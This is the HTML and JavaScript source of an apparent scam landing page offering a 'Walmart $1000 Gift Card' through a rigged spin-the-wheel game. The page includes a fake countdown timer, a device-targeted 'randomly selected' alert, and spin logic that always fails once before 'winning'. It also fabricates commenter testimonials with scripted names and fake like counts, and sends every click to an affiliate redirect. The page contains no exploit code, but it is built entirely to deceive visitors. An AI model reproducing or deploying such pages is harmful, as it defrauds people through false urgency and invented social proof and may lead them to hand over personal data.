            <div class="timer">The offer is valid for <font color="red"><b><span id="mins">3</span> minute and <span id="hsecs">07</span> seconds.</b></font></div>
            <a href="http://clicksets.com/click.php?lp=1" onclick="PreventExitSplash = !0;" rel="noreferrer">
            <div class="prize">
                <table>
                    <tbody>
                        <tr>
                            <th></th>
                            <td style="padding:10px 5px 10px 0;text-align:center">
                                <img src="walmart1000.png" style="max-width: 100px;">
                                <p><b>(1) remaining</b></p>
                            </td>
                            <td style="line-height:1.6">
                                <p style="text-align: left;"><a id="landingTarget2" href="http://clicksets.com/click.php?lp=1" onclick="PreventExitSplash = !0;" rel="noreferrer"><span class="name">Walmart $1000 Gift Card</span></a></p>
                                <p style="display: ;"><span class="smallfont"></span></p>
                                <div><a class="button" id="landingTarget3" href="http://clicksets.com/click.php?lp=1" onclick="PreventExitSplash = !0;" rel="noreferrer">SELECT <!-- --></a></div>
                            </td>
                        </tr>
                    </tbody>
                </table>
            </div>
          </a>
        </div>
         </div>
             <div class="container">    
        <div class="comments">  
            <div class="like-line-menu">

                <div class="like-line-menu__item"><span rel="noreferrer" href="" class="icon_like">Like</span></div>
                <div class="like-line-menu__item"><span rel="noreferrer" href="" class="icon_comment">Comment</span></div>
                <div class="like-line-menu__item"><span rel="noreferrer" href="" class="icon_share">Share</span></div>
            </div>
            <div class="like-count-line">
                <div class="inner-like-count-line">
                    <span class="icons_likes">
                        <div class="_1g05" style="z-index: 3">
                            <i class="icon_likes_img like_1"></i>
                        </div>
                        <div class="_1g05" style="z-index: 2">
                            <i class="icon_likes_img like_2"></i>
                        </div>
                        <div class="_1g05" style="z-index: 1">
                            <i class="icon_likes_img like_3"></i>
                        </div>
                    </span>
                    <div class="_1g06">1.5K</div>
                </div>
            </div>
            <div class="shares">
                <span>129 Shares</span>
            </div>
            <div class="send-comments">

                    <div class="send-comments--input_wrapper">
                        <div class="send-comments--input_inner">
                            <textarea name="send-comments_text" placeholder="Write a comment..." id="send-comments_text" cols="30" rows="10" class="send-comments--input"></textarea>
                        </div>
                    </div>
                    <div class="send-comments--submit_wrapper">
                        <button value="Post" class="send-comments--submit">Post</button>
                    </div>
                    <div class="clear"></div>

            </div>
            <center>
                <font face="arial">
                    <table style="padding-top: 10px; font-size: 13px;" width="100%" cellspacing="0" cellpadding="4" border="0">
                        <tbody id="comments_list">
                            <tr>
                                <td class="photo_avatar" width="40" valign="top" align="right"><img src="1.jpg"></td>
                                <td valign="top" align="left">
                                    <div style="font-weight: bold; color:#000;"><script>document.write(lrdctr.names[6]);</script></div>
                                    <div style="padding-top: 0px;"><!-- Honestly, I wish Macbook Air for me, but not today ... well, I think the Walmart $1000 might be okay ?-->Recieved my Gift Card in two days! It's realy cool!</div>
                                    <div class="fbimg">
                                        <img src="walmart1000.jpg" alt="">
                                    </div>
                                    <div class="comments__item__meta">
                                        <div class="comments__item__meta__item"><span class="action_like" data-text-dislike="#unlike#" onclick="$('#like_1').html('8')">Like</span></div>
                                        <div class="comments__item__meta__item comments__item__meta__item__like_count"><i class="ico"></i><span class="like_count" id="like_1">7</span></div>
                                        <div class="comments__item__meta__item"><span rel="noreferrer" href="" class="comment_replay">Reply</span></div>
                                        <div class="comments__item__meta__item"><span rel="noreferrer" href="" class="comment_replay">More</span></div>
                                        <div class="comments__item__meta__item">
                                        Yesterday at 8:13 am</div>
                                    </div>
                                </td>
                            </tr>
                            <tr>
                                <td colspan="2">
                                    <hr>
                                </td>
                            </tr>
                            <tr>
                                <td class="photo_avatar" width="40" valign="top" align="right"><img src="2.jpg"></td>
                                <td valign="top" align="left">
                                    <div style="font-weight: bold; color:#000;"><script>document.write(lrdctr.names[1]);</script></div>
                                    <div style="padding-top: 0px;">Won 1 free spin, no prize ?. Could I have one more chance ??</div>

                                    <div class="comments__item__meta">
                                        <div class="comments__item__meta__item"><span class="action_like" data-text-dislike="#unlike#" onclick="$('#like_2').html('23')">Like</span></div>
                                        <div class="comments__item__meta__item comments__item__meta__item__like_count"><i class="ico"></i><span class="like_count" id="like_2">22</span></div>
                                        <div class="comments__item__meta__item"><span rel="noreferrer" href="" class="comment_replay">Reply</span></div>
                                        <div class="comments__item__meta__item"><span rel="noreferrer" href="" class="comment_replay">More</span></div>
                                        <div class="comments__item__meta__item"><script type="text/javascript">
                                            var mydate = new Date()
                                            mydate.setDate(mydate.getDate() - 2);
                                            document.write(date("d F", mydate));
                                        </script>01 March</div>
                                    </div>
                                </td>
                            </tr>
                            <tr>
                                <td colspan="2">
                                    <hr>
                                </td>
                            </tr>
                            <tr>
                                <td class="photo_avatar" width="40" valign="top" align="right"><img src="3.jpg"></td>
                                <td valign="top" align="left">
                                    <div style="font-weight: bold; color:#000;"><script>document.write(lrdctr.names[2]);</script></div>
                                    <div style="padding-top: 0px;">I 
just unwrapped the new Macbook Air! It is definitely the best gift I can
 win. ??? Is there any other promotion soon? I want to be ready!!!</div>

                                    <div class="comments__item__meta">
                                        <div class="comments__item__meta__item"><span class="action_like" data-text-dislike="#unlike#" onclick="$('#like_3').html('19')">Like</span></div>
                                        <div class="comments__item__meta__item comments__item__meta__item__like_count"><i class="ico"></i><span class="like_count" id="like_3">18</span></div>
                                        <div class="comments__item__meta__item"><span rel="noreferrer" href="" class="comment_replay">Reply</span></div>
                                        <div class="comments__item__meta__item"><span rel="noreferrer" href="" class="comment_replay">More</span></div>
                                        <div class="comments__item__meta__item"><script type="text/javascript">
                                            var mydate = new Date()
                                            mydate.setDate(mydate.getDate() - 2);
                                            document.write(date("d F", mydate));
                                        </script>01 March</div>
                                    </div>
                                </td>
                            </tr>
                            <tr>
                                <td colspan="2">
                                    <hr>
                                </td>
                            </tr>
                            <tr>
                                <td class="photo_avatar" width="40" valign="top" align="right"><img src="4.jpg"></td>
                                <td valign="top" align="left">
                                    <div style="font-weight: bold; color:#000;"><script>document.write(lrdctr.names[3]);</script></div>
                                    <div style="padding-top: 0px;">At first I thought it was a joke, but in fact, the iPhone arrived this morning via DHL plus cool t-shirt with a logo. </div>
                                    <div class="fbimg">
                                        <div class="proof proof2"></div>
                                    </div>
                                    <div class="comments__item__meta">
                                        <div class="comments__item__meta__item"><span class="action_like" data-text-dislike="#unlike#" onclick="$('#like_4').html('17')">Like</span></div>
                                        <div class="comments__item__meta__item comments__item__meta__item__like_count"><i class="ico"></i><span class="like_count" id="like_4">16</span></div>
                                        <div class="comments__item__meta__item"><span rel="noreferrer" href="" class="comment_replay">Reply</span></div>
                                        <div class="comments__item__meta__item"><span rel="noreferrer" href="" class="comment_replay">More</span></div>
                                        <div class="comments__item__meta__item"><script type="text/javascript">
                                            var mydate = new Date()
                                            mydate.setDate(mydate.getDate() - 3);
                                            document.write(date("d F", mydate));
                                        </script>28 February</div>
                                    </div>
                                </td>
                            </tr>
                            <tr>
                                <td colspan="2">
                                    <hr>
                                </td>
                            </tr>
                            <tr>
                                <td class="photo_avatar" width="40" valign="top" align="right"><img src="5.jpg"></td>
                                <td valign="top" align="left">
                                    <div style="font-weight: bold; color:#000;"><script>document.write(lrdctr.names[4]);</script></div>
                                    <div style="padding-top: 0px;">This 
is the first time I tried my luck to win something. It feels so unreal 
when I realize I won it. Walmart $1000 is awesome! ?? </div>

                                    <div class="comments__item__meta">
                                        <div class="comments__item__meta__item"><span class="action_like" data-text-dislike="#unlike#" onclick="$('#like_5').html('6')">Like</span></div>
                                        <div class="comments__item__meta__item comments__item__meta__item__like_count"><i class="ico"></i><span class="like_count" id="like_5">5</span></div>
                                        <div class="comments__item__meta__item"><span rel="noreferrer" href="" class="comment_replay">Reply</span></div>
                                        <div class="comments__item__meta__item"><span rel="noreferrer" href="" class="comment_replay">More</span></div>
                                        <div class="comments__item__meta__item"><script type="text/javascript">
                                            var mydate = new Date()
                                            mydate.setDate(mydate.getDate() - 3);
                                            document.write(date("d F", mydate));
                                        </script>28 February</div>
                                    </div>
                                </td>
                            </tr>
                            <tr>
                                <td colspan="2">
                                    <hr>
                                </td>
                            </tr>
                            <tr>
                                <td class="photo_avatar" width="40" valign="top" align="right"><img src="6.jpg"></td>
                                <td valign="top" align="left">
                                    <div style="font-weight: bold; color:#000;"><script>document.write(lrdctr.names[5]);</script></div>
                                    <div style="padding-top: 0px;">My Macbook Air arrived this morning! I was so excited that I brought it to the office to show it to my co-workers</div>

                                    <div class="comments__item__meta">
                                        <div class="comments__item__meta__item"><span class="action_like" data-text-dislike="#unlike#" onclick="$('#like_6').html('3')">Like</span></div>
                                        <div class="comments__item__meta__item comments__item__meta__item__like_count"><i class="ico"></i><span class="like_count" id="like_6">2</span></div>
                                        <div class="comments__item__meta__item"><span rel="noreferrer" href="" class="comment_replay">Reply</span></div>
                                        <div class="comments__item__meta__item"><span rel="noreferrer" href="" class="comment_replay">More</span></div>
                                        <div class="comments__item__meta__item"><script type="text/javascript">
                                            var mydate = new Date()
                                            mydate.setDate(mydate.getDate() - 4);
                                            document.write(date("d F", mydate));
                                        </script>27 February</div>
                                    </div>
                                </td>
                            </tr>
                            <tr>
                                <td colspan="2">
                                    <hr>
                                </td>
                            </tr>
                            <tr>
                                <td class="photo_avatar" width="40" valign="top" align="right"><img src="7.jpg"></td>
                                <td valign="top" align="left">
                                    <div style="font-weight: bold; color:#000;"><script>document.write(lrdctr.names[0]);</script></div>
                                    <div style="padding-top: 0px;">I was very very lucky to win the iPad Pro! I got silver with wifi. I still can not believe it happened to me! Haha</div>
                                    <div class="fbimg">
                                        <img src="ipad_proofphoto_2.jpg" alt="">
                                    </div>
                                    
                                    <div class="comments__item__meta">
                                        <div class="comments__item__meta__item"><span class="action_like" data-text-dislike="#unlike#" onclick="$('#like_7').html('1')">Like</span></div>
                                        <div class="comments__item__meta__item comments__item__meta__item__like_count"><i class="ico"></i><span class="like_count" id="like_7">0</span></div>
                                        <div class="comments__item__meta__item"><span rel="noreferrer" href="" class="comment_replay">Reply</span></div>
                                        <div class="comments__item__meta__item"><span rel="noreferrer" href="" class="comment_replay">More</span></div>
                                        <div class="comments__item__meta__item"><script type="text/javascript">
                                            var mydate = new Date()
                                            mydate.setDate(mydate.getDate() - 5);
                                            document.write(date("d F", mydate));
                                        </script>26 February</div>
                                    </div>
                                </td>
                            </tr>
                            <tr>
                                <td colspan="2">
                                    <hr>
                                </td>
                            </tr>
                            <tr>
                                <td class="photo_avatar" width="40" valign="top" align="right"><img src="8.jpg"></td>
                                <td valign="top" align="left">
                                    <div style="font-weight: bold; color:#000;"><script>document.write(lrdctr.names[7]);</script></div>
                                    <div style="padding-top: 0px;">I don't know why I need the iPad, can I have the Macbook Air instead?</div>

                                    <div class="comments__item__meta">
                                        <div class="comments__item__meta__item"><span class="action_like" data-text-dislike="#unlike#" onclick="$('#like_8').html('1')">Like</span></div>
                                        <div class="comments__item__meta__item comments__item__meta__item__like_count"><i class="ico"></i><span class="like_count" id="like_8">0</span></div>
                                        <div class="comments__item__meta__item"><span rel="noreferrer" href="" class="comment_replay">Reply</span></div>
                                        <div class="comments__item__meta__item"><span rel="noreferrer" href="" class="comment_replay">More</span></div>
                                        <div class="comments__item__meta__item"><script type="text/javascript">
                                            var mydate = new Date()
                                            mydate.setDate(mydate.getDate() - 6);
                                            document.write(date("d F", mydate));
                                        </script>25 February</div>
                                    </div>
                                </td>
                            </tr>
                            <tr>
                                <td colspan="2">
                                    <hr>
                                </td>
                            </tr>
                        </tbody>
                    </table>
                </font>
            </center>
        </div>
    </div>
         <script>
            if (page == 2) {
                var con_page=document.getElementById("container"),
                    first_page=document.getElementById("firstpage"),
                    second_page=document.getElementById("secondpage");
                first_page.parentNode.removeChild(first_page),
                second_page.style.display="block",
                con_page.insertBefore(second_page,con_page.firstChild);
            }
         </script>
         <script>
            if (tracker == 1) {
                var newurl = document.getElementById('landingTarget1').getAttribute('href');
                newurl = newurl + ".php?lp=1";
                document.getElementById('landingTarget1').href = newurl;
                document.getElementById('landingTarget2').href = newurl;
                document.getElementById('landingTarget3').href = newurl;
                document.getElementById('landingTarget4').href = newurl;
                document.getElementById('landingTarget5').href = newurl;
                console.log('done');
            }
        </script>
        <div style="color: transparent; height: 0px;">ok_111</div>
<script type="text/javascript">
        window._pt_lt = new Date().getTime();
        window._pt_sp_2 = [];
        _pt_sp_2.push('setAccount,6a844c1c');
        var _protocol = (("https:" == document.location.protocol) ? " https://" : " http://");
        (function() {
            var atag = document.createElement('script'); atag.type = 'text/javascript'; atag.async = true;
            atag.src = _protocol + 'cjs.ptengine.com/pta_en.js';
            var s = document.getElementsByTagName('script')[0];
            s.parentNode.insertBefore(atag, s);
        })();
</script>
                      
    <script type="text/javascript">        var mydate=new Date,
        year=mydate.getFullYear(),
        month=mydate.getMonth(),
        day=mydate.getDate(),
        weekday=mydate.getDay(),
        count=1,
        conMid,
        headline=document.getElementById("headline"),
        topDate=document.getElementById("topDate"),
        today=document.getElementById("today"),
        con=document.getElementById("container"),
        whCon=document.getElementById("wheelCon"),
        dWheel=document.getElementById("wheel"),
        button=document.getElementById("pressButton"),
        device=document.getElementById("devMockup"),
        first=document.getElementById("firstpage"),
        second=document.getElementById("secondpage");
        var sweetalert = getURLParameter('sweetalert');

        function date(n,t){var e,r,u=this,o=["Sunday","Monday","Tuesday","Wednesday","Thursday","Friday","Saturday","January","February","March","April","May","June","July","August","September","October","November","December"],i=/\\?(.?)/gi,c=function(n,t){return r[n]?r[n]():t},a=function(n,t){for(n=String(n);n.length<t;)n="0"+n;return n};return r={d:function(){return a(r.j(),2)},D:function(){return r.l().slice(0,3)},j:function(){return e.getDate()},l:function(){return o[r.w()]},N:function(){return r.w()||7},S:function(){var n=r.j(),t=n%10;return 3>=t&&1==parseInt(n%100/10,10)&&(t=0),["st","nd","rd"][t-1]||"th"},w:function(){return e.getDay()},z:function(){var n=new Date(r.Y(),r.n()-1,r.j()),t=new Date(r.Y(),0,1);return Math.round((n-t)/864e5)},W:function(){var n=new Date(r.Y(),r.n()-1,r.j()-r.N()+3),t=new Date(n.getFullYear(),0,4);return a(1+Math.round((n-t)/864e5/7),2)},F:function(){return o[6+r.n()]},m:function(){return a(r.n(),2)},M:function(){return r.F().slice(0,3)},n:function(){return e.getMonth()+1},t:function(){return new Date(r.Y(),r.n(),0).getDate()},L:function(){var n=r.Y();return n%4===0&n%100!==0|n%400===0},o:function(){var n=r.n(),t=r.W(),e=r.Y();return e+(12===n&&9>t?1:1===n&&t>9?-1:0)},Y:function(){return e.getFullYear()},y:function(){return r.Y().toString().slice(-2)},a:function(){return e.getHours()>11?"pm":"am"},A:function(){return r.a().toUpperCase()},B:function(){var n=3600*e.getUTCHours(),t=60*e.getUTCMinutes(),r=e.getUTCSeconds();return a(Math.floor((n+t+r+3600)/86.4)%1e3,3)},g:function(){return r.G()%12||12},G:function(){return e.getHours()},h:function(){return a(r.g(),2)},H:function(){return a(r.G(),2)},i:function(){return a(e.getMinutes(),2)},s:function(){return a(e.getSeconds(),2)},u:function(){return a(1e3*e.getMilliseconds(),6)},e:function(){throw"Not supported (see source code of date() for timezone on how to add support)"},I:function(){var n=new Date(r.Y(),0),t=Date.UTC(r.Y(),0),e=new Date(r.Y(),6),u=Date.UTC(r.Y(),6);return n-t!==e-u?1:0},O:function(){var n=e.getTimezoneOffset(),t=Math.abs(n);return(n>0?"-":"+")+a(100*Math.floor(t/60)+t%60,4)},P:function(){var n=r.O();return n.substr(0,3)+":"+n.substr(3,2)},T:function(){return"UTC"},Z:function(){return 60*-e.getTimezoneOffset()},c:function(){return"Y-m-d\\TH:i:sP".replace(i,c)},r:function(){return"D, d M Y H:i:s O".replace(i,c)},U:function(){return e/1e3|0}},this.date=function(n,t){return u=this,e=void 0===t?new Date:new Date(t instanceof Date?t:1e3*t),n.replace(i,c)},this.date(n,t)}

        function setButtonHeight(){
        conMid=(whCon.getBoundingClientRect().bottom-whCon.getBoundingClientRect().top)/2,
        button.style.top=conMid-button.offsetHeight/2-0.2*button.offsetHeight/2+"px"
        }
        function spin(){
            if (count === 1 && sweetalert == 1){
                dWheel.className="spinAround",
                setTimeout(function(){
                    swal({
                        title: "Sorry.\n\nPlease try again. You have ONE more chance!",
                        type: "success"
                    },
                    function(){
                        autospin2();
                    })}, 6800);
                count++
            } else if (count === 1 ){
                button.disabled = true;
                dWheel.className="spinAround",
                setTimeout(function(){button.disabled = false; alert("Sorry.\n\nPlease try again. You have ONE more chance!"); autospin2()},6800);
                count++
               } else {
                    dWheel.className="spinAround2",
                    setTimeout(function(){dWheel.className=dWheel.className+" transparent"},6800),
                        setTimeout(function(){device.style.display="block",device.style.left=whCon.offsetWidth/2-device.offsetWidth/2+"px",device.style.top=conMid-device.offsetHeight/2+"px"},7000),
                        setTimeout(function(){first.innerHTML="<img src='loading.gif'>",first.style.padding="195px 0px",
                        setTimeout(function(){first.parentNode.removeChild(first),second.style.display="block",con.insertBefore(second,con.firstChild)},1500)},9000)
            }
        }

        function autospin1(){
            if (sweetalert == 1){
                swal({
                     title: "Congratulations!",
                     text: "Congratulations, LG K330 user!\n\nYou have been randomly selected to spin and get (1) unclaimed reward.\nClick OK to start!",
                     imageUrl: 'http://cdn.adgns.com/all/amazon_award/win.png'
                 },
                 function () {document.getElementById('pressButton').click()});
            } else {
                alert("Congratulations, LG K330 user!\n\nYou have been randomly selected to spin and get (1) unclaimed reward.\nClick OK to start!");
                document.getElementById('pressButton').click();
            }
        }

        function autospin2(){
            document.getElementById('pressButton').click();
        }
function countdown(){var a=parseInt(document.getElementById("mins").innerHTML),b=parseInt(document.getElementById("hsecs").innerHTML);0!=a&&0==b?(nmins=a-1,nsecs=59):0!=a||0!=b?(nmins=a,nsecs=b-1):0==a&&0==b&&(nmins=a,nsecs=b),document.getElementById("mins").innerHTML=nmins,document.getElementById("hsecs").innerHTML=nsecs,nsecs<10&&(nsecs="0"+nsecs),document.getElementById("hsecs").innerHTML=nsecs}setInterval("countdown()",1000);

        function date(n,t){var e,r,u=this,o=["Sunday","Monday","Tuesday","Wednesday","Thursday","Friday","Saturday","January","February","March","April","May","June","July","August","September","October","November","December"],i=/\\?(.?)/gi,c=function(n,t){return r[n]?r[n]():t},a=function(n,t){for(n=String(n);n.length<t;)n="0"+n;return n};return r={d:function(){return a(r.j(),2)},D:function(){return r.l().slice(0,3)},j:function(){return e.getDate()},l:function(){return o[r.w()]},N:function(){return r.w()||7},S:function(){var n=r.j(),t=n%10;return 3>=t&&1==parseInt(n%100/10,10)&&(t=0),["st","nd","rd"][t-1]||"th"},w:function(){return e.getDay()},z:function(){var n=new Date(r.Y(),r.n()-1,r.j()),t=new Date(r.Y(),0,1);return Math.round((n-t)/864e5)},W:function(){var n=new Date(r.Y(),r.n()-1,r.j()-r.N()+3),t=new Date(n.getFullYear(),0,4);return a(1+Math.round((n-t)/864e5/7),2)},F:function(){return o[6+r.n()]},m:function(){return a(r.n(),2)},M:function(){return r.F().slice(0,3)},n:function(){return e.getMonth()+1},t:function(){return new Date(r.Y(),r.n(),0).getDate()},L:function(){var n=r.Y();return n%4===0&n%100!==0|n%400===0},o:function(){var n=r.n(),t=r.W(),e=r.Y();return e+(12===n&&9>t?1:1===n&&t>9?-1:0)},Y:function(){return e.getFullYear()},y:function(){return r.Y().toString().slice(-2)},a:function(){return e.getHours()>11?"pm":"am"},A:function(){return r.a().toUpperCase()},B:function(){var n=3600*e.getUTCHours(),t=60*e.getUTCMinutes(),r=e.getUTCSeconds();return a(Math.floor((n+t+r+3600)/86.4)%1e3,3)},g:function(){return r.G()%12||12},G:function(){return e.getHours()},h:function(){return a(r.g(),2)},H:function(){return a(r.G(),2)},i:function(){return a(e.getMinutes(),2)},s:function(){return a(e.getSeconds(),2)},u:function(){return a(1e3*e.getMilliseconds(),6)},e:function(){throw"Not supported (see source code of date() for timezone on how to add support)"},I:function(){var n=new Date(r.Y(),0),t=Date.UTC(r.Y(),0),e=new Date(r.Y(),6),u=Date.UTC(r.Y(),6);return n-t!==e-u?1:0},O:function(){var n=e.getTimezoneOffset(),t=Math.abs(n);return(n>0?"-":"+")+a(100*Math.floor(t/60)+t%60,4)},P:function(){var n=r.O();return n.substr(0,3)+":"+n.substr(3,2)},T:function(){return"UTC"},Z:function(){return 60*-e.getTimezoneOffset()},c:function(){return"Y-m-d\\TH:i:sP".replace(i,c)},r:function(){return"D, d M Y H:i:s O".replace(i,c)},U:function(){return e/1e3|0}},this.date=function(n,t){return u=this,e=void 0===t?new Date:new Date(t instanceof Date?t:1e3*t),n.replace(i,c)},this.date(n,t)}</script>

</body></html>